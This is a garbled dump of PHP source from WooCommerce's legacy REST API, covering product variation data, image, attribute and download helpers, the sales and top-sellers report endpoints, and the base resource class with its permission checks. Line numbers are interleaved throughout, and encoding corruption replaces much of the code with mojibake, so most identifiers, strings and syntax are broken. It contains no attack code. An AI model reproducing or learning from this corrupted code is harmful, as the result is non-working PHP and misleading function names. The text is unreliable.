Ğ
$v¬ŸtiÚ
->
	`g‘_»guÏr_´iû
(), 2 ),

361 '§Ë_´iû' => 
$v¬ŸtiÚ
->
	`g‘_§Ë_´iû
(è? 
	`wc_fÜm©_decim®
Ğ$v¬ŸtiÚ->g‘_§Ë_´iû(), 2 ) : 
nuÎ
,

362 'xabË' => 
$v¬ŸtiÚ
->
	`is_xabË
(),

363 'x_¡©us' => 
$v¬ŸtiÚ
->
	`g‘_x_¡©us
(),

364 'x_şass' => 
$v¬ŸtiÚ
->
	`g‘_x_şass
(),

365 '¡ock_quªt™y' => (è
$v¬ŸtiÚ
->
	`g‘_¡ock_quªt™y
(),

366 'š_¡ock' => 
$v¬ŸtiÚ
->
	`is_š_¡ock
(),

367 'backÜd”ed' => 
$v¬ŸtiÚ
->
	`is_Ú_backÜd”
(),

368 'purcha£abË' => 
$v¬ŸtiÚ
->
	`is_purcha§bË
(),

369 'visibË' => 
$v¬ŸtiÚ
->
	`v¬ŸtiÚ_is_visibË
(),

370 'Ú_§Ë' => 
$v¬ŸtiÚ
->
	`is_Ú_§Ë
(),

371 'weight' => 
$v¬ŸtiÚ
->
	`g‘_weight
(è? 
	`wc_fÜm©_decim®
Ğ$v¬ŸtiÚ->g‘_weight(), 2 ) : 
nuÎ
,

372 'dim’siÚs' => 
	`¬¿y
(

373 'Ëngth' => 
$v¬ŸtiÚ
->
Ëngth
,

374 'width' => 
$v¬ŸtiÚ
->
width
,

375 'height' => 
$v¬ŸtiÚ
->
height
,

376 'un™' => 
	`g‘_İtiÚ
( 'woocommerce_dimension_unit' ),

378 'shpšg_şass' => 
$v¬ŸtiÚ
->
	`g‘_shpšg_şass
(),

379 'shpšg_şass_id' => ( 0 !=ğ
$v¬ŸtiÚ
->
	`g‘_shpšg_şass_id
(èè? $v¬ŸtiÚ->g‘_shpšg_şass_id(è: 
nuÎ
,

380 'image' => 
$this
->
	`g‘_images
Ğ
$v¬ŸtiÚ
 ),

381 '©Œibu‹s' => 
$this
->
	`g‘_©Œibu‹s
Ğ
$v¬ŸtiÚ
 ),

382 'dowÆßds' => 
$this
->
	`g‘_dowÆßds
Ğ
$v¬ŸtiÚ
 ),

383 'dowÆßd_lim™' => (è
$´oduù
->
dowÆßd_lim™
,

384 'dowÆßd_expœy' => (è
$´oduù
->
dowÆßd_expœy
,

388  
$v¬ŸtiÚs
;

389 
	}
}

398 
´iv©e
 
funùiÚ
 
	$g‘_images
Ğ
$´oduù
 ) {

400 
$images
 = 
$©chm’t_ids
 = 
	`¬¿y
();

402 iàĞ
$´oduù
->
	`is_ty³
( 'variation' ) ) {

404 iàĞ
	`has_po¡_thumbÇ
Ğ
$´oduù
->
	`g‘_v¬ŸtiÚ_id
() ) ) {

407 
$©chm’t_ids
[] = 
	`g‘_po¡_thumbÇ_id
Ğ
$´oduù
->
	`g‘_v¬ŸtiÚ_id
() );

409 } 
	`–£if
 ( 
	`has_po¡_thumbÇ
Ğ
$´oduù
->
id
 ) ) {

412 
$©chm’t_ids
[] = 
	`g‘_po¡_thumbÇ_id
Ğ
$´oduù
->
id
 );

418 iàĞ
	`has_po¡_thumbÇ
Ğ
$´oduù
->
id
 ) ) {

419 
$©chm’t_ids
[] = 
	`g‘_po¡_thumbÇ_id
Ğ
$´oduù
->
id
 );

423 
$©chm’t_ids
 = 
	`¬¿y_m”ge
Ğ$©chm’t_ids, 
$´oduù
->
	`g‘_g®Ëry_©chm’t_ids
() );

427 
	`fÜ—ch
 ( 
$©chm’t_ids
 
as
 
$pos™iÚ
 => 
$©chm’t_id
 ) {

429 
$©chm’t_po¡
 = 
	`g‘_po¡
Ğ
$©chm’t_id
 );

431 iàĞ
	`is_nuÎ
Ğ
$©chm’t_po¡
 ) )

434 
$©chm’t
 = 
	`wp_g‘_©chm’t_image_¤c
Ğ
$©chm’t_id
, 'full' );

436 iàĞ! 
	`is_¬¿y
Ğ
$©chm’t
 ) )

439 
$images
[] = 
	`¬¿y
(

440 'id' => (è
$©chm’t_id
,

441 'ü—‹d_©' => 
$this
->
£rv”
->
	`fÜm©_d©‘ime
Ğ
$©chm’t_po¡
->
po¡_d©e_gmt
 ),

442 'upd©ed_©' => 
$this
->
£rv”
->
	`fÜm©_d©‘ime
Ğ
$©chm’t_po¡
->
po¡_modif›d_gmt
 ),

443 '¤c' => 
	`cu¼’t
Ğ
$©chm’t
 ),

444 't™Ë' => 
	`g‘_the_t™Ë
Ğ
$©chm’t_id
 ),

445 '®t' => 
	`g‘_po¡_m‘a
Ğ
$©chm’t_id
, '_wp_©chm’t_image_®t', 
Œue
 ),

446 'pos™iÚ' => 
$pos™iÚ
,

451 iàĞ
	`em±y
Ğ
$images
 ) ) {

453 
$images
[] = 
	`¬¿y
(

455 'ü—‹d_©' => 
$this
->
£rv”
->
	`fÜm©_d©‘ime
Ğ
	`time
() ),

456 'upd©ed_©' => 
$this
->
£rv”
->
	`fÜm©_d©‘ime
Ğ
	`time
() ),

457 '¤c' => 
	`wc_¶aûhŞd”_img_¤c
(),

458 't™Ë' => 
	`__
( 'Placeholder', 'woocommerce' ),

459 '®t' => 
	`__
( 'Placeholder', 'woocommerce' ),

464  
$images
;

465 
	}
}

474 
´iv©e
 
funùiÚ
 
	$g‘_©Œibu‹s
Ğ
$´oduù
 ) {

476 
$©Œibu‹s
 = 
	`¬¿y
();

478 iàĞ
$´oduù
->
	`is_ty³
( 'variation' ) ) {

481 
	`fÜ—ch
 ( 
$´oduù
->
	`g‘_v¬ŸtiÚ_©Œibu‹s
(è
as
 
$©Œibu‹_Çme
 => 
$©Œibu‹
 ) {

484 
$©Œibu‹s
[] = 
	`¬¿y
(

485 'Çme' => 
	`ucwÜds
Ğ
	`¡r_»¶aû
Ğ'©Œibu‹_', '', sŒ_»¶aûĞ'·_', '', 
$©Œibu‹_Çme
 ) ) ),

486 'İtiÚ' => 
$©Œibu‹
,

492 
	`fÜ—ch
 ( 
$´oduù
->
	`g‘_©Œibu‹s
(è
as
 
$©Œibu‹
 ) {

495 iàĞ
$©Œibu‹
['is_taxonomy'] )

496 
$İtiÚs
 = 
	`ex¶ode
Ğ',', 
$´oduù
->
	`g‘_©Œibu‹
Ğ
$©Œibu‹
['name'] ) );

498 
$İtiÚs
 = 
	`ex¶ode
Ğ'|', 
$´oduù
->
	`g‘_©Œibu‹
Ğ
$©Œibu‹
['name'] ) );

500 
$©Œibu‹s
[] = 
	`¬¿y
(

501 'Çme' => 
	`ucwÜds
Ğ
	`¡r_»¶aû
Ğ'·_', '', 
$©Œibu‹
['name'] ) ),

502 'pos™iÚ' => 
$©Œibu‹
['position'],

503 'visibË' => (
boŞ
è
$©Œibu‹
['is_visible'],

504 'v¬ŸtiÚ' => (
boŞ
è
$©Œibu‹
['is_variation'],

505 'İtiÚs' => 
	`¬¿y_m­
Ğ'Œim', 
$İtiÚs
 ),

510  
$©Œibu‹s
;

511 
	}
}

520 
´iv©e
 
funùiÚ
 
	$g‘_dowÆßds
Ğ
$´oduù
 ) {

522 
$dowÆßds
 = 
	`¬¿y
();

524 iàĞ
$´oduù
->
	`is_dowÆßdabË
() ) {

526 
	`fÜ—ch
 ( 
$´oduù
->
	`g‘_fes
(è
as
 
$fe_id
 => 
$fe
 ) {

528 
$dowÆßds
[] = 
	`¬¿y
(

529 'id' => 
$fe_id
,

530 'Çme' => 
$fe
['name'],

531 'fe' => 
$fe
['file'],

536  
$dowÆßds
;

537 
	}
}

	@includes/api/class-wc-api-reports.php

1 <?
php


13 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

16 şas 
	cWC_API_R•Üts
 
ex‹nds
 
	mWC_API_Resourû
 {

19 
´Ùeùed
 
	m$ba£
 = '/reports';

22 
´iv©e
 
	m$»pÜt
;

34 
public
 
funùiÚ
 
	$»gi¡”_rou‹s
Ğ
$rou‹s
 ) {

36 #GET /
»pÜts


37 
$rou‹s
[ 
$this
->
ba£
 ] = 
	`¬¿y
(

38 
	`¬¿y
Ğ¬¿yĞ
$this
, 'g‘_»pÜts' ), 
WC_API_S”v”
::
READABLE
 ),

41 #GET /
»pÜts
/
§Ës


42 
$rou‹s
[ 
$this
->
ba£
 . '/§Ës'] = 
	`¬¿y
(

43 
	`¬¿y
Ğ¬¿yĞ
$this
, 'g‘_§Ës_»pÜt' ), 
WC_API_S”v”
::
READABLE
 ),

46 #GET /
»pÜts
/
§Ës
/
tİ_£Î”s


47 
$rou‹s
[ 
$this
->
ba£
 . '/§Ës/tİ_£Î”s' ] = 
	`¬¿y
(

48 
	`¬¿y
Ğ¬¿yĞ
$this
, 'g‘_tİ_£Î”s_»pÜt' ), 
WC_API_S”v”
::
READABLE
 ),

51  
$rou‹s
;

60 
public
 
funùiÚ
 
	$g‘_»pÜts
() {

62  
	`¬¿y
( 'reports' =>‡rray( 'sales', 'sales/top_sellers' ) );

63 
	}
}

73 
public
 
funùiÚ
 
g‘_§Ës_»pÜt
Ğ
$f›lds
 = 
nuÎ
, 
$f‹r
 = 
	$¬¿y
() ) {

76 
$check
 = 
$this
->
	`v®id©e_»que¡
();

78 iàĞ
	`is_wp_”rÜ
Ğ
$check
 ) )

79  
$check
;

82 
$this
->
	`£tup_»pÜt
Ğ
$f‹r
 );

85 
$tÙ®s
 = 
$this
->
»pÜt
->
	`g‘_Üd”_»pÜt_d©a
Ğ
	`¬¿y
(

86 'd©a' => 
	`¬¿y
(

87 '_Üd”_tÙ®' => 
	`¬¿y
(

92 '_Üd”_x' => 
	`¬¿y
(

97 '_Üd”_shpšg_x' => 
	`¬¿y
(

102 '_Üd”_shpšg' => 
	`¬¿y
(

107 'ID' => 
	`¬¿y
(

113 'f‹r_¿nge' => 
Œue
,

117 
$tÙ®_™ems
 = 
	`absšt
Ğ
$this
->
»pÜt
->
	`g‘_Üd”_»pÜt_d©a
Ğ
	`¬¿y
(

118 'd©a' => 
	`¬¿y
(

119 '_qty' => 
	`¬¿y
(

127 'f‹r_¿nge' => 
Œue
,

131 
$tÙ®_discouÁ
 = 
$this
->
»pÜt
->
	`g‘_Üd”_»pÜt_d©a
Ğ
	`¬¿y
(

132 'd©a' => 
	`¬¿y
(

133 'discouÁ_amouÁ' => 
	`¬¿y
(

140 'wh”e' => 
	`¬¿y
(

141 
	`¬¿y
(

148 'f‹r_¿nge' => 
Œue
,

152 
$u£rs_qu”y
 = 
Ãw
 
	`WP_U£r_Qu”y
(

153 
	`¬¿y
(

154 'f›lds' => 
	`¬¿y
( 'user_registered' ),

159 
$cu¡om”s
 = 
$u£rs_qu”y
->
	`g‘_»suÉs
();

161 
	`fÜ—ch
 ( 
$cu¡om”s
 
as
 
$key
 => 
$cu¡om”
 ) {

162 iàĞ
	`¡¹Ùime
Ğ
$cu¡om”
->
u£r_»gi¡”ed
 ) < 
$this
->
»pÜt
->
¡¬t_d©e
 || sŒtÙimeĞ$cu¡om”->u£r_»gi¡”ed ) > $this->»pÜt->
’d_d©e
 )

163 
	`un£t
Ğ
$cu¡om”s
[ 
$key
 ] );

166 
$tÙ®_cu¡om”s
 = 
	`couÁ
Ğ
$cu¡om”s
 );

169 
$Üd”s
 = 
$this
->
»pÜt
->
	`g‘_Üd”_»pÜt_d©a
Ğ
	`¬¿y
(

170 'd©a' => 
	`¬¿y
(

171 '_Üd”_tÙ®' => 
	`¬¿y
(

176 '_Üd”_shpšg' => 
	`¬¿y
(

181 '_Üd”_x' => 
	`¬¿y
(

186 '_Üd”_shpšg_x' => 
	`¬¿y
(

191 'ID' => 
	`¬¿y
(

195 'di¡šù' => 
Œue
,

197 'po¡_d©e' => 
	`¬¿y
(

203 'group_by' => 
$this
->
»pÜt
->
group_by_qu”y
,

206 'f‹r_¿nge' => 
Œue
,

210 
$Üd”_™ems
 = 
$this
->
»pÜt
->
	`g‘_Üd”_»pÜt_d©a
Ğ
	`¬¿y
(

211 'd©a' => 
	`¬¿y
(

212 '_qty' => 
	`¬¿y
(

218 'po¡_d©e' => 
	`¬¿y
(

224 'wh”e' => 
	`¬¿y
(

225 
	`¬¿y
(

231 'group_by' => 
$this
->
»pÜt
->
group_by_qu”y
,

234 'f‹r_¿nge' => 
Œue
,

238 
$discouÁs
 = 
$this
->
»pÜt
->
	`g‘_Üd”_»pÜt_d©a
Ğ
	`¬¿y
(

239 'd©a' => 
	`¬¿y
(

240 'discouÁ_amouÁ' => 
	`¬¿y
(

246 'po¡_d©e' => 
	`¬¿y
(

252 'wh”e' => 
	`¬¿y
(

253 
	`¬¿y
(

259 'group_by' => 
$this
->
»pÜt
->
group_by_qu”y
 . ', order_item_name',

262 'f‹r_¿nge' => 
Œue
,

265 
$³riod_tÙ®s
 = 
	`¬¿y
();

268  
$i
 = 0; $˜<ğ
$this
->
»pÜt
->
ch¬t_š‹rv®
; $i ++ ) {

270  
$this
->
»pÜt
->
ch¬t_groupby
 ) {

272 
$time
 = 
	`d©e
Ğ'Y-m-d', 
	`¡¹Ùime
Ğ"+{$i} DAY", 
$this
->
»pÜt
->
¡¬t_d©e
 ) );

275 
$time
 = 
	`d©e
Ğ'Y-m', 
	`¡¹Ùime
Ğ"+{$i} MONTH", 
$this
->
»pÜt
->
¡¬t_d©e
 ) );

280 
$cu¡om”_couÁ
 = 0;

281 
	`fÜ—ch
 ( 
$cu¡om”s
 
as
 
$cu¡om”
 ) {

283 iàĞ
	`d©e
ĞĞ'day' =ğ
$this
->
»pÜt
->
ch¬t_groupby
 ) ? 'Y-m-d' : 'Y-m', 
	`¡¹Ùime
Ğ
$cu¡om”
->
u£r_»gi¡”ed
 ) ) =ğ
$time
 ) {

284 
$cu¡om”_couÁ
++;

288 
$³riod_tÙ®s
[ 
$time
 ] = 
	`¬¿y
(

289 '§Ës' => 
	`wc_fÜm©_decim®
( 0.00, 2 ),

292 'x' => 
	`wc_fÜm©_decim®
( 0.00, 2 ),

293 'shpšg' => 
	`wc_fÜm©_decim®
( 0.00, 2 ),

294 'discouÁ' => 
	`wc_fÜm©_decim®
( 0.00, 2 ),

295 'cu¡om”s' => 
$cu¡om”_couÁ
,

300 
	`fÜ—ch
 ( 
$Üd”s
 
as
 
$Üd”
 ) {

302 
$time
 = ( 'day' ==ğ
$this
->
»pÜt
->
ch¬t_groupby
 ) ? 
	`d©e
Ğ'Y-m-d', 
	`¡¹Ùime
Ğ
$Üd”
->
po¡_d©e
 ) ) : date( 'Y-m', strtotime( $order->post_date ) );

304 iàĞ! 
	`is£t
Ğ
$³riod_tÙ®s
[ 
$time
 ] ) )

307 
$³riod_tÙ®s
[ 
$time
 ]['§Ës'] = 
	`wc_fÜm©_decim®
Ğ
$Üd”
->
tÙ®_§Ës
, 2 );

308 
$³riod_tÙ®s
[ 
$time
 ]['Üd”s'] = (è
$Üd”
->
tÙ®_Üd”s
;

309 
$³riod_tÙ®s
[ 
$time
 ]['x'] = 
	`wc_fÜm©_decim®
Ğ
$Üd”
->
tÙ®_x
 + $Üd”->
tÙ®_shpšg_x
, 2 );

310 
$³riod_tÙ®s
[ 
$time
 ]['shpšg'] = 
	`wc_fÜm©_decim®
Ğ
$Üd”
->
tÙ®_shpšg
, 2 );

314 
	`fÜ—ch
 ( 
$Üd”_™ems
 
as
 
$Üd”_™em
 ) {

316 
$time
 = ( 'day' ==ğ
$this
->
»pÜt
->
ch¬t_groupby
 ) ? 
	`d©e
Ğ'Y-m-d', 
	`¡¹Ùime
Ğ
$Üd”_™em
->
po¡_d©e
 ) ) : date( 'Y-m', strtotime( $order_item->post_date ) );

318 iàĞ! 
	`is£t
Ğ
$³riod_tÙ®s
[ 
$time
 ] ) )

321 
$³riod_tÙ®s
[ 
$time
 ]['™ems'] = (è
$Üd”_™em
->
Üd”_™em_couÁ
;

325 
	`fÜ—ch
 ( 
$discouÁs
 
as
 
$discouÁ
 ) {

327 
$time
 = ( 'day' ==ğ
$this
->
»pÜt
->
ch¬t_groupby
 ) ? 
	`d©e
Ğ'Y-m-d', 
	`¡¹Ùime
Ğ
$discouÁ
->
po¡_d©e
 ) ) : date( 'Y-m', strtotime( $discount->post_date ) );

329 iàĞ! 
	`is£t
Ğ
$³riod_tÙ®s
[ 
$time
 ] ) )

332 
$³riod_tÙ®s
[ 
$time
 ]['discouÁ'] = 
	`wc_fÜm©_decim®
Ğ
$discouÁ
->
discouÁ_amouÁ
, 2 );

335 
$§Ës_d©a
 = 
	`¬¿y
(

336 'tÙ®_§Ës' => 
	`wc_fÜm©_decim®
Ğ
$tÙ®s
->
§Ës
, 2 ),

337 'av”age_§Ës' => 
	`wc_fÜm©_decim®
Ğ
$tÙ®s
->
§Ës
 / ( 
$this
->
»pÜt
->
ch¬t_š‹rv®
 + 1 ), 2 ),

338 'tÙ®_Üd”s' => (è
$tÙ®s
->
Üd”_couÁ
,

339 'tÙ®_™ems' => 
$tÙ®_™ems
,

340 'tÙ®_x' => 
	`wc_fÜm©_decim®
Ğ
$tÙ®s
->
x
 + $tÙ®s->
shpšg_x
, 2 ),

341 'tÙ®_shpšg' => 
	`wc_fÜm©_decim®
Ğ
$tÙ®s
->
shpšg
, 2 ),

342 'tÙ®_discouÁ' => 
	`is_nuÎ
Ğ
$tÙ®_discouÁ
 ) ? 
	`wc_fÜm©_decim®
( 0.00, 2 ) : wc_format_decimal( $total_discount, 2 ),

343 'tÙ®s_grou³d_by' => 
$this
->
»pÜt
->
ch¬t_groupby
,

344 'tÙ®s' => 
$³riod_tÙ®s
,

345 'tÙ®_cu¡om”s' => 
$tÙ®_cu¡om”s
,

348  
	`¬¿y
Ğ'§Ës' => 
	`­¶y_f‹rs
Ğ'woocomm”û_­i_»pÜt_»¥Ú£', 
$§Ës_d©a
, 
$this
->
»pÜt
, 
$f›lds
, $this->
£rv”
 ) );

349 
	}
}

359 
public
 
funùiÚ
 
g‘_tİ_£Î”s_»pÜt
Ğ
$f›lds
 = 
nuÎ
, 
$f‹r
 = 
	$¬¿y
() ) {

362 
$check
 = 
$this
->
	`v®id©e_»que¡
();

364 iàĞ
	`is_wp_”rÜ
Ğ
$check
 ) ) {

365  
$check
;

369 
$this
->
	`£tup_»pÜt
Ğ
$f‹r
 );

371 
$tİ_£Î”s
 = 
$this
->
»pÜt
->
	`g‘_Üd”_»pÜt_d©a
Ğ
	`¬¿y
(

372 'd©a' => 
	`¬¿y
(

373 '_´oduù_id' => 
	`¬¿y
(

379 '_qty' => 
	`¬¿y
(

388 'lim™' => 
	`is£t
Ğ
$f‹r
['lim™'] ) ? 
	`absšt
( $filter['limit'] ) : 12,

390 'f‹r_¿nge' => 
Œue
,

393 
$tİ_£Î”s_d©a
 = 
	`¬¿y
();

395 
	`fÜ—ch
 ( 
$tİ_£Î”s
 
as
 
$tİ_£Î”
 ) {

397 
$´oduù
 = 
	`g‘_´oduù
Ğ
$tİ_£Î”
->
´oduù_id
 );

399 
$tİ_£Î”s_d©a
[] = 
	`¬¿y
(

400 't™Ë' => 
$´oduù
->
	`g‘_t™Ë
(),

401 '´oduù_id' => 
$tİ_£Î”
->
´oduù_id
,

402 'quªt™y' => 
$tİ_£Î”
->
Üd”_™em_qty
,

406  
	`¬¿y
Ğ'tİ_£Î”s' => 
	`­¶y_f‹rs
Ğ'woocomm”û_­i_»pÜt_»¥Ú£', 
$tİ_£Î”s_d©a
, 
$this
->
»pÜt
, 
$f›lds
, $this->
£rv”
 ) );

407 
	}
}

415 
´iv©e
 
funùiÚ
 
	$£tup_»pÜt
Ğ
$f‹r
 ) {

417 
	`šşude_Úû
Ğ
	`WC
()->
	`¶ugš_·th
() . '/includes/admin/reports/class-wc-admin-report.php' );

419 
$this
->
»pÜt
 = 
Ãw
 
	`WC_Admš_R•Üt
();

421 iàĞ
	`em±y
Ğ
$f‹r
['period'] ) ) {

424 
$f‹r
['period'] = 'custom';

426 iàĞ! 
	`em±y
Ğ
$f‹r
['date_min'] ) || !ƒmpty( $filter['date_max'] ) ) {

429 
$_GET
['¡¬t_d©e'] = 
$this
->
£rv”
->
	`·r£_d©‘ime
Ğ
$f‹r
['date_min'] );

430 
$_GET
['’d_d©e'] = 
	`is£t
Ğ
$f‹r
['d©e_max'] ) ? 
$this
->
£rv”
->
	`·r£_d©‘ime
Ğ$f‹r['d©e_max'] ) : 
nuÎ
;

435 
$_GET
['¡¬t_d©e'] = $_GET['’d_d©e'] = 
	`d©e
Ğ'Y-m-d', 
	`cu¼’t_time
( 'timestamp' ) );

441 iàĞ! 
	`š_¬¿y
Ğ
$f‹r
['³riod'], 
	`¬¿y
( 'week', 'month', 'last_month', 'year' ) ) ) {

442 
$f‹r
['period'] = 'week';

447 iàĞ'w“k' ==ğ
$f‹r
['period'] ) {

448 
$f‹r
['period'] = '7day';

452 
$this
->
»pÜt
->
	`ÿlcuÏ‹_cu¼’t_¿nge
Ğ
$f‹r
['period'] );

453 
	}
}

465 
´Ùeùed
 
funùiÚ
 
	$v®id©e_»que¡
Ğ
$id
 = 
nuÎ
, 
$ty³
 =‚uÎ, 
$cÚ‹xt
 =‚ull ) {

467 iàĞ! 
	`cu¼’t_u£r_ÿn
( 'view_woocommerce_reports' ) ) {

469  
Ãw
 
	`WP_E¼Ü
Ğ'woocomm”û_­i_u£r_ÿÂÙ_»ad_»pÜt', 
	`__
Ğ'You dØnÙ hav³rmissiÚØ»adhi »pÜt', 'woocomm”û' ), 
	`¬¿y
( 'status' => 401 ) );

473  
Œue
;

475 
	}
}

	@includes/api/class-wc-api-resource.php

1 <?
php


13 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

15 şas 
	cWC_API_Resourû
 {

18 
´Ùeùed
 
	m$£rv”
;

21 
´Ùeùed
 
	m$ba£
;

30 
public
 
funùiÚ
 
	$__cÚ¡ruù
Ğ
WC_API_S”v”
 
$£rv”
 ) {

32 
$this
->
£rv”
 = 
$£rv”
;

35 
	`add_f‹r
Ğ'woocomm”û_­i_’dpošts', 
	`¬¿y
Ğ
$this
, 'register_routes' ) );

40 
	`fÜ—ch
 ( 
	`¬¿y
Ğ'Üd”', 'coupÚ', 'cu¡om”', '´oduù', '»pÜt' ) 
as
 
$»sourû
 ) {

42 
	`add_f‹r
Ğ"woocomm”û_­i_{$»sourû}_»¥Ú£", 
	`¬¿y
Ğ
$this
, 'maybe_add_meta' ), 15, 2 );

43 
	`add_f‹r
Ğ"woocomm”û_­i_{$»sourû}_»¥Ú£", 
	`¬¿y
Ğ
$this
, 'filter_response_fields' ), 20, 3 );

60 
´Ùeùed
 
funùiÚ
 
	$v®id©e_»que¡
Ğ
$id
, 
$ty³
, 
$cÚ‹xt
 ) {

62 iàĞ'shİ_Üd”' ==ğ
$ty³
 || 'shop_coupon' === $type )

63 
$»sourû_Çme
 = 
	`¡r_»¶aû
Ğ'shİ_', '', 
$ty³
 );

65 
$»sourû_Çme
 = 
$ty³
;

67 
$id
 = 
	`absšt
( $id );

70 iàĞ
	`em±y
Ğ
$id
 ) )

71  
Ãw
 
	`WP_E¼Ü
Ğ"woocomm”û_­i_šv®id_{$»sourû_Çme}_id", 
	`¥rštf
Ğ
	`__
Ğ'Inv®id % ID', 'woocomm”û' ), 
$ty³
 ), 
	`¬¿y
( 'status' => 404 ) );

74 iàĞ'cu¡om”' !=ğ
$ty³
 ) {

76 
$po¡
 = 
	`g‘_po¡
Ğ
$id
 );

79 
$po¡_ty³
 = ( '´oduù_v¬ŸtiÚ' ==ğ
$po¡
->
po¡_ty³
 ) ? 'product' : $post->post_type;

82 iàĞ
$ty³
 !=ğ
$po¡_ty³
 )

83  
Ãw
 
	`WP_E¼Ü
Ğ"woocomm”û_­i_šv®id_{$»sourû_Çme}", 
	`¥rštf
Ğ
	`__
Ğ'Inv®id %s', 'woocomm”û' ), 
$»sourû_Çme
 ), 
	`¬¿y
( 'status' => 404 ) );

86  
$cÚ‹xt
 ) {

89 iàĞ! 
$this
->
	`is_»adabË
Ğ
$po¡
 ) )

90  
Ãw
 
	`WP_E¼Ü
Ğ"woocomm”û_­i_u£r_ÿÂÙ_»ad_{$»sourû_Çme}", 
	`¥rštf
Ğ
	`__
Ğ'You dØnÙ hav³rmissiÚØ»adhi %s', 'woocomm”û' ), 
$»sourû_Çme
 ), 
	`¬¿y
( 'status' => 401 ) );

94 iàĞ! 
$this
->
	`is_ed™abË
Ğ
$po¡
 ) )

95  
Ãw
 
	`WP_E¼Ü
Ğ"woocomm”û_­i_u£r_ÿÂÙ_ed™_{$»sourû_Çme}", 
	`¥rštf
Ğ
	`__
Ğ'You dØnÙ hav³rmissiÚØed™hi %s', 'woocomm”û' ), 
$»sourû_Çme
 ), 
	`¬¿y
( 'status' => 401 ) );

99 iàĞ! 
$this
->
	`is_d–‘abË
Ğ
$po¡
 ) )

100  
Ãw
 
	`WP_E¼Ü
Ğ"woocomm”û_­i_u£r_ÿÂÙ_d–‘e_{$»sourû_Çme}", 
	`¥rštf
Ğ
	`__
Ğ'You dØnÙ hav³rmissiÚØd–‘thi %s', 'woocomm”û' ), 
$»sourû_Çme
 ), 
	`¬¿y
( 'status' => 401 ) );

105  
$id
;

106 
	}
}

116 
´Ùeùed
 
funùiÚ
 
	$m”ge_qu”y_¬gs
Ğ
$ba£_¬gs
, 
$»que¡_¬gs
 ) {

118 
$¬gs
 = 
	`¬¿y
();

121 iàĞ! 
	`em±y
Ğ
$»que¡_¬gs
['created_at_min'] ) || !ƒmpty( $request_args['created_at_max'] ) || !ƒmpty( $request_args['updated_at_min'] ) || !ƒmpty( $request_args['updated_at_max'] ) ) {

123 
$¬gs
['d©e_qu”y'] = 
	`¬¿y
();

126 iàĞ! 
	`em±y
Ğ
$»que¡_¬gs
['created_at_min'] ) )

127 
$¬gs
['d©e_qu”y'][] = 
	`¬¿y
Ğ'cŞumn' => 'po¡_d©e_gmt', 'aá”' => 
$this
->
£rv”
->
	`·r£_d©‘ime
Ğ
$»que¡_¬gs
['ü—‹d_©_mš'] ), 'šşusive' => 
Œue
 );

130 iàĞ! 
	`em±y
Ğ
$»que¡_¬gs
['created_at_max'] ) )

131 
$¬gs
['d©e_qu”y'][] = 
	`¬¿y
Ğ'cŞumn' => 'po¡_d©e_gmt', 'befÜe' => 
$this
->
£rv”
->
	`·r£_d©‘ime
Ğ
$»que¡_¬gs
['ü—‹d_©_max'] ), 'šşusive' => 
Œue
 );

134 iàĞ! 
	`em±y
Ğ
$»que¡_¬gs
['updated_at_min'] ) )

135 
$¬gs
['d©e_qu”y'][] = 
	`¬¿y
Ğ'cŞumn' => 'po¡_modif›d_gmt', 'aá”' => 
$this
->
£rv”
->
	`·r£_d©‘ime
Ğ
$»que¡_¬gs
['upd©ed_©_mš'] ), 'šşusive' => 
Œue
 );

138 iàĞ! 
	`em±y
Ğ
$»que¡_¬gs
['updated_at_max'] ) )

139 
$¬gs
['d©e_qu”y'][] = 
	`¬¿y
Ğ'cŞumn' => 'po¡_modif›d_gmt', 'befÜe' => 
$this
->
£rv”
->
	`·r£_d©‘ime
Ğ
$»que¡_¬gs
['upd©ed_©_max'] ), 'šşusive' => 
Œue
 );

143 iàĞ! 
	`em±y
Ğ
$»que¡_¬gs
['q'] ) )

144 
$¬gs
['s'] = 
$»que¡_¬gs
['q'];

147 iàĞ! 
	`em±y
Ğ
$»que¡_¬gs
['limit'] ) )

148 
$¬gs
['po¡s_³r_·ge'] = 
$»que¡_¬gs
['limit'];

151 iàĞ! 
	`em±y
Ğ
$»que¡_¬gs
['offset'] ) )

152 
$¬gs
['off£t'] = 
$»que¡_¬gs
['offset'];

155 
$¬gs
['·ged'] = ( 
	`is£t
Ğ
$»que¡_¬gs
['·ge'] ) ) ? 
	`absšt
( $request_args['page'] ) : 1;

157  
	`¬¿y_m”ge
Ğ
$ba£_¬gs
, 
$¬gs
 );

158 
	}
}

169 
public
 
funùiÚ
 
	$maybe_add_m‘a
Ğ
$d©a
, 
$»sourû
 ) {

171 iàĞ
	`is£t
Ğ
$this
->
£rv”
->
·¿ms
['GET']['f‹r']['m‘a'] ) && 'Œue' ==ğ$this->£rv”->·¿ms['GET']['f‹r']['m‘a'] && 
	`is_objeù
Ğ
$»sourû
 ) ) {

174 iàĞ
	`´eg_g»p
Ğ'/[a-z]+_m‘a/', 
	`¬¿y_keys
Ğ
$d©a
 ) ) )

175  
$d©a
;

178  
	`g‘_şass
Ğ
$»sourû
 ) ) {

181 
$m‘a_Çme
 = 'order_meta';

185 
$m‘a_Çme
 = 'coupon_meta';

189 
$m‘a_Çme
 = 'customer_meta';

193 
$m‘a_Çme
 = 'product_meta';

197 iàĞ
	`is_a
Ğ
$»sourû
, 'WP_User' ) ) {

200 
$m‘a
 = (
¬¿y
è
	`g‘_u£r_m‘a
Ğ
$»sourû
->
ID
 );

202 } 
	`–£if
 ( 
	`is_a
Ğ
$»sourû
, 'WC_Product_Variation' ) ) {

205 
$m‘a
 = (
¬¿y
è
	`g‘_po¡_m‘a
Ğ
$»sourû
->
	`g‘_v¬ŸtiÚ_id
() );

210 
$m‘a
 = (
¬¿y
è
	`g‘_po¡_m‘a
Ğ
$»sourû
->
id
 );

213 
	`fÜ—ch
Ğ
$m‘a
 
as
 
$m‘a_key
 => 
$m‘a_v®ue
 ) {

216 iàĞ! 
	`is_´Ùeùed_m‘a
Ğ
$m‘a_key
 ) ) {

217 
$d©a
[ 
$m‘a_Çme
 ][ 
$m‘a_key
 ] = 
	`maybe_un£rŸlize
Ğ
$m‘a_v®ue
[0] );

223  
$d©a
;

224 
	}
}

235 
public
 
funùiÚ
 
	$f‹r_»¥Ú£_f›lds
Ğ
$d©a
, 
$»sourû
, 
$f›lds
 ) {

237 iàĞ! 
	`is_¬¿y
Ğ
$d©a
 ) || 
	`em±y
Ğ
$f›lds
 ) )

238  
$d©a
;

240 
$f›lds
 = 
	`ex¶ode
( ',', $fields );

241 
$sub_f›lds
 = 
	`¬¿y
